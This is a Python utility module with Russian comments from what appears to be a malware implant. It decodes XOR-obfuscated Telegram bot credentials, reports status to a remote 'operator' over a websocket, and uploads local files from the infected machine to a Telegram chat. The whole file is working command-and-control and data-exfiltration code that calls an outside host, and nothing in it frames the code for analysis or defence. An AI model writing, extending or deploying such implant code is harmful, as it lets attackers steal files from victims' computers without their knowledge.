# --- Файл: utils.py (Версия 3.0 с логированием ошибок) ---
import os
import requests
import json
import asyncio
import settings
import implant_config

TEMP_PATH = implant_config.TEMP_PATH

def get_secret(encrypted_value: str) -> str:
    key = settings.ENCRYPTION_KEY
    if not encrypted_value or not key: return ""
    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(encrypted_value, key * (len(encrypted_value) // len(key) + 1)))

def send_status_to_operator(ws, loop, message, is_error=False):
    """
    Отправляет статус оператору. Если is_error=True, форматирует как ошибку.
    """
    if ws and not ws.closed and loop:
        try:
            # Добавляем эмодзи для наглядности
            prefix = "❌ " if is_error else "✅ "
            full_message = f"{prefix}{message}"

            payload_str = json.dumps({'type': 'status', 'data': full_message})
            coro = ws.send_str(payload_str)
            asyncio.run_coroutine_threadsafe(coro, loop)
        except Exception as e:
            # Эта ошибка будет видна только в локальной консоли импланта (при отладке)
            print(f"[!] Не удалось отправить статус оператору: {e}")

# Функции для Telegram остаются без изменений.
def send_telegram_document(file_path, caption=""):
    bot_token = get_secret(settings.ENC_BOT_TOKEN)
    chat_id = get_secret(settings.ENC_CHAT_ID)
    if not bot_token or not chat_id: return False
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    try:
        with open(file_path, "rb") as f:
            files = {'document': (os.path.basename(file_path), f)}
            data = {'chat_id': chat_id, 'caption': caption}
            response = requests.post(url, files=files, data=data, timeout=20)
            return response.status_code == 200
    except:
        return False

def send_telegram_message(message):
    bot_token = get_secret(settings.ENC_BOT_TOKEN)
    chat_id = get_secret(settings.ENC_CHAT_ID)
    if not bot_token or not chat_id: return
    import urllib.parse, urllib.request
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={urllib.parse.quote_plus(message)}"
        urllib.request.urlopen(url, timeout=10)
    except:
        pass
